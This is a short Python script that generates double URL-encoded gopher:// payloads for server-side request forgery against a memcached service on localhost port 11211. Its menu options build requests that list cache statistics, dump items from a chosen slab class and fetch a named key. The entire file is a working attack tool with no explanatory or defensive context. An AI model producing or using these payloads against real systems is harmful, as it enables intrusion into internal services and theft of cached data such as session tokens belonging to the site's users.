import urllib.parse

func = int(input("[1] - List Itens\n[2] - Dump\n[3] - Get some key\nOption: "))

if func == 1:
    list_items = f"stats items\r\nquit\r\n\r\n"
    print(f"gopher://localhost:11211/_",end="")
    print(urllib.parse.quote(urllib.parse.quote(list_items)))
elif func == 2:
    slab_class = str(input("slab class: "))
    items_length = str(input("How many items do you wanna dump: "))
    dump = f"stats cachedump {slab_class} {items_length}\r\nquit\r\n\r\n"
    print(f"gopher://localhost:11211/_",end="")
    print(urllib.parse.quote(urllib.parse.quote(dump)))
elif func == 3:
    name = str(input("Item name: "))
    get_key = f"get {name}\r\nquit\r\n\r\n"
    print(f"gopher://localhost:11211/_",end="")
    print(urllib.parse.quote(urllib.parse.quote(get_key)))
else:
    print("Invalid option")
